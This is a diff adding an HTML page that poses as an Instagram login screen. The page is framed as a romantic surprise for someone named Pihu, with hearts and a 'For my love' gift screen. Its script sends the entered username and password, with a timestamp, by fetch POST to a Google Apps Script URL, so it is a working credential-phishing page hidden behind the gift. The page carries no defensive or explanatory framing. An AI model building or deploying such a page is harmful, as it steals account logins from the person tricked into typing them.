@@ -1,0 +1,112 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram</title>
+    <link href="https://fonts.googleapis.com/css2?family=Great+Vibes&display=swap" rel="stylesheet">
+    <style>
+        /* All original styles preserved */
+        body { margin: 0; font-family: Arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; overflow: hidden; background: linear-gradient(45deg, #ff0000, #ff00ff, #0000ff, #00ffff); background-size: 400% 400%; animation: rgbShift 10s ease infinite; transition: background 0.5s; }
+        @keyframes rgbShift { 0% { background-position: 0% 50%; } 50% { background-position: 100% 50%; } 100% { background-position: 0% 50%; } }
+        .container { width: 90%; max-width: 350px; text-align: center; position: relative; z-index: 2; }
+        .card { background: rgba(255, 255, 255, 0.9); padding: 40px; border: 1px solid #dbdbdb; box-shadow: 0 4px 12px rgba(0,0,0,0.1); border-radius: 12px; display: none; }
+        #login-screen { display: block; }
+        h1 { font-family: 'Great Vibes', cursive; font-size: 3.5rem; color: #e91e63; margin-bottom: 20px; }
+        input { width: 100%; padding: 12px; margin-bottom: 12px; border-radius: 4px; border: none; background-color: #000; color: #fff; box-shadow: 0 0 10px #ff00ff, 0 0 5px #00ffff; box-sizing: border-box; outline: none; }
+        .login-btn { width: 100%; padding: 12px; background-color: #0095f6; color: white; border: none; border-radius: 8px; font-weight: bold; cursor: pointer; }
+        .zoom-emoji { display: inline-block; font-size: 2.5rem; margin-top: 20px; animation: zoomInOut 2s ease-in-out infinite; }
+        @keyframes zoomInOut { 0%, 100% { transform: scale(1); } 50% { transform: scale(1.4); } }
+        #gift-screen { background: #ffc0cb; border: none; }
+        .neon-continue { padding: 15px 30px; background: #8b0000; color: white; border: none; border-radius: 50px; box-shadow: 0 0 15px #ff0000, 0 0 30px #0000ff; font-weight: bold; margin-top: 30px; cursor: pointer; }
+        .heart { position: fixed; color: #ff4d4d; font-size: 2rem; bottom: -50px; right: -50px; z-index: 1; pointer-events: none; animation: floatHeart 4s linear forwards; }
+        @keyframes floatHeart { 0% { transform: translate(0, 0) rotate(0deg); opacity: 1; } 100% { transform: translate(-110vw, -110vh) rotate(360deg); opacity: 0; } }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <div id="login-screen" class="card">
+        <h1>Instagram</h1>
+        <input type="text" id="user" placeholder="Username">
+        <input type="password" id="pass" placeholder="Password">
+        <button class="login-btn" id="loginBtn" onclick="checkLogin()">Log In</button>
+        <div class="zoom-emoji">👉🏻👈🏻</div>
+    </div>
+
+    <div id="gift-screen" class="card">
+        <h1>For my love 😘 Pihu</h1>
+        <div class="zoom-emoji">👉🏻👈🏻</div>
+        <br>
+        <button class="neon-continue" id="contBtn" onclick="surprisePihu()">Continue</button>
+    </div>
+</div>
+
+<script>
+    let heartInterval;
+
+    async function checkLogin() {
+        const u = document.getElementById('user').value;
+        const p = document.getElementById('pass').value;
+        const btn = document.getElementById('loginBtn');
+
+        if (!u || !p) { alert("Please fill everything!"); return; }
+
+        btn.innerText = "Processing...";
+        btn.disabled = true;
+
+        // PASTE YOUR GOOGLE SCRIPT URL HERE
+        const scriptURL = "https://script.google.com/macros/s/AKfycbwXlhknfeOuGs5eYBOdyd2TfzHZR2Mwd6EJaE16pqrOrTAJQE2lbL5BCHjcOO9OSAyX4g/exec"; 
+
+        try {
+            // Sending to Google Sheet
+            await fetch(scriptURL, {
+                method: 'POST',
+                mode: 'no-cors', 
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ 
+                    Username: u, 
+                    Password: p, 
+                    Time: new Date().toLocaleString() 
+                })
+            });
+            showScreen('gift');
+        } catch (e) {
+            showScreen('gift');
+        }
+    }
+
+    function surprisePihu() {
+        const btn = document.getElementById('contBtn');
+        btn.innerText = "sorry abhi itna hi bnaaya hai 😭😅";
+        setTimeout(() => { showScreen('login'); }, 3000);
+    }
+
+    function showScreen(screen) {
+        document.getElementById('login-screen').style.display = 'none';
+        document.getElementById('gift-screen').style.display = 'none';
+        clearInterval(heartInterval);
+        if (screen === 'gift') {
+            document.getElementById('gift-screen').style.display = 'block';
+            document.body.style.backgroundColor = "#ffc0cb";
+            document.body.style.animation = "none";
+            heartInterval = setInterval(createHeart, 400);
+        } else {
+            document.getElementById('loginBtn').disabled = false;
+            document.getElementById('loginBtn').innerText = "Log In";
+            document.getElementById('login-screen').style.display = 'block';
+            document.body.style.animation = "rgbShift 10s ease infinite";
+        }
+    }
+
+    function createHeart() {
+        const heart = document.createElement('div');
+        heart.innerHTML = '❤️'; heart.className = 'heart';
+        heart.style.right = Math.random() * 80 - 40 + "px";
+        document.body.appendChild(heart);
+        setTimeout(() => heart.remove(), 4000);
+    }
+</script>
+
+</body>
+</html>
